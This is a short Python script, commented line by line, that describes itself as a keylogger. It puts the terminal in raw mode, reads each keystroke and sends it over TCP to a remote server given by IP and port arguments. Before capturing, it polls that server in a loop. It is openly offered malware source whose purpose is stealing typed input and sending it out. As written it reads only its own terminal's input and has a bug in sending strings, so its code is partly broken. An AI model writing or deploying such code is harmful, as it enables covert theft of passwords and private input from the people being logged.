#!/bin/python

# this program is a keylogger that logs and sends the keys to a server which IP and port are provided as arguments

import socket # import the socket module to create a network connection
import sys # import the sys module to access command-line arguments
import time # import the time module to use sleep function for waiting
import os # import the os module to access the system functions
import tty # import the tty module to change terminal settings
import termios # import the termios module to access terminal I/O

# get the server IP and port from the command-line arguments
ip = sys.argv[1]
port = int(sys.argv[2])

# check if the server is up
def check_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a socket object for TCP/IP communication
    s.settimeout(1) # set a timeout for the socket operation
    try:
        s.connect((ip, port)) # try to connect to the server
        s.close() # close the socket
        return True # return True if the server is up and reachable
    except:
        return False # return False if the server is not reachable

# send the keys to the server
def send_keys(keys):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a new socket object for TCP/IP communication
    s.connect((ip, port)) # connect to the server
    s.send(keys) # send the keys to the server
    print(f"sent keys: {keys}") # print the sent keys
    s.close() # close the socket

# the keylogger function
def keylogger():
    fd = sys.stdin.fileno() # get the file descriptor of the stdin file object
    old = termios.tcgetattr(fd) # save the current terminal settings
    try:
        tty.setraw(sys.stdin.fileno()) # set the terminal to raw mode
        while True:
            try:
                ch = sys.stdin.read(1) # read one character from the stdin
                if ch == '\x03': # if the character is Ctrl-C, break the loop
                    break
                send_keys(ch) # send the character to the server
                print(ch,end='',flush=True) # print the character to the console without newline and flush the output buffer
            except KeyboardInterrupt: # if the user presses Ctrl-C, break the loop
                break
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old) # restore the original terminal settings

# main function
if __name__ == "__main__":
    while True:
        if check_server(): # check if the server is up
            keylogger() # start the keylogger
        else:
            print("server is down") # print a message if the server is not up
            time.sleep(1) # wait for 1 second before checking the server again
